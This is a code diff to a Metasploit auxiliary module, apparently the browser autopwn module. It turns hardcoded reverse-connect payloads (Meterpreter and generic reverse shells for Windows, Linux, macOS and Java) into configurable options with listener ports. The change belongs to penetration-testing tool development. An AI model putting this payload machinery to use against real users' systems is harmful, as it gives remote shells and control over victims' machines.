@@ -77,19 +77,39 @@ class Metasploit3 < Msf::Auxiliary
 				false
 			]),
 			OptPort.new('LPORT_WIN32', [false,
-				'The port to use for Windows reverse-connect payloads, default is 3333'
+				'The port to use for Windows reverse-connect payloads', 3333
+			]),
+			OptString.new('PAYLOAD_WIN32', [false,
+				'The payload to use for Windows reverse-connect payloads',
+				'windows/meterpreter/reverse_tcp'
 			]),
 			OptPort.new('LPORT_LINUX', [false,
-				'The port to use for Linux reverse-connect payloads, default is 4444'
+				'The port to use for Linux reverse-connect payloads', 4444
 			]),
-			OptPort.new('LPORT_MAC', [false,
-				'The port to use for Mac reverse-connect payloads, default is 5555'
+			OptString.new('PAYLOAD_LINUX', [false,
+				'The payload to use for Linux reverse-connect payloads',
+				'linux/meterpreter/reverse_tcp'
+			]),
+			OptPort.new('LPORT_MACOS', [false,
+				'The port to use for Mac reverse-connect payloads', 5555
+			]),
+			OptString.new('PAYLOAD_MACOS', [false,
+				'The payload to use for Mac reverse-connect payloads',
+				'osx/meterpreter/reverse_tcp'
 			]),
 			OptPort.new('LPORT_GENERIC', [false,
-				'The port to use for generic reverse-connect payloads, default is 6666'
+				'The port to use for generic reverse-connect payloads', 6666
+			]),
+			OptString.new('PAYLOAD_GENERIC', [false,
+				'The payload to use for generic reverse-connect payloads6',
+				'generic/shell_reverse_tcp'
 			]),
 			OptPort.new('LPORT_JAVA', [false,
-				'The port to use for Java reverse-connect payloads, default is 7777'
+				'The port to use for Java reverse-connect payloads', 7777
+			]),
+			OptString.new('PAYLOAD_JAVA', [false,
+				'The payload to use for Java reverse-connect payloads',
+				'java/meterpreter/reverse_tcp'
 			]),
 		], self.class)
 
@@ -236,11 +256,16 @@ class Metasploit3 < Msf::Auxiliary
 		# self-identifying payloads so we'd only need 1 LPORT for multiple
 		# stagers.
 		#
-		@win_lport  = datastore['LPORT_WIN32'] || 3333
-		@lin_lport  = datastore['LPORT_LINUX'] || 4444
-		@osx_lport  = datastore['LPORT_MACOS'] || 5555
-		@gen_lport  = datastore['LPORT_GENERIC'] || 6666
-		@java_lport = datastore['LPORT_JAVA'] || 7777
+		@win_lport  = datastore['LPORT_WIN32']
+		@win_payload  = datastore['PAYLOAD_WIN32']
+		@lin_lport  = datastore['LPORT_LINUX']
+		@lin_payload  = datastore['PAYLOAD_LINUX']
+		@osx_lport  = datastore['LPORT_MACOS']
+		@osx_payload  = datastore['PAYLOAD_MACOS']
+		@gen_lport  = datastore['LPORT_GENERIC']
+		@gen_payload  = datastore['PAYLOAD_GENERIC']
+		@java_lport = datastore['LPORT_JAVA']
+		@java_payload = datastore['PAYLOAD_JAVA']
 
 		minrank = framework.datastore['MinimumRank'] || 'manual'
 		if not RankingName.values.include?(minrank)
@@ -266,23 +291,31 @@ class Metasploit3 < Msf::Auxiliary
 
 		case name
 		when %r{windows}
-			payload='windows/meterpreter/reverse_tcp'
+			payload = @win_payload
 			lport = @win_lport
-		#when %r{linux}
-			# Some day...
-			#payload='linux/meterpreter/reverse_tcp'
-		#when %r{osx}
-			# Some day...
-			#payload='osx/meterpreter/reverse_tcp'
+=begin
+		#
+		# Some day, we'll support Linux and Mac OS X here.. 
+		#
+
+		when %r{linux}
+			payload = @lin_payload
+			lport = @lin_lport
+
+		when %r{osx}
+			payload = @osx_payload
+			lport = @osx_lport
+=end
+
 		# We need to check that it's /java_ instead of just java since it would
 		# clash with things like mozilla_navigatorjava.  Better would be to
 		# check the actual platform of the module here but i'm lazy.
 		when %r{/java_}
-			payload='java/meterpreter/reverse_tcp'
+			payload = @java_payload
 			lport = @java_lport
 		else
+			payload = @gen_payload
 			lport = @gen_lport
-			payload='generic/shell_reverse_tcp'
 		end
 		@payloads[lport] = payload
 
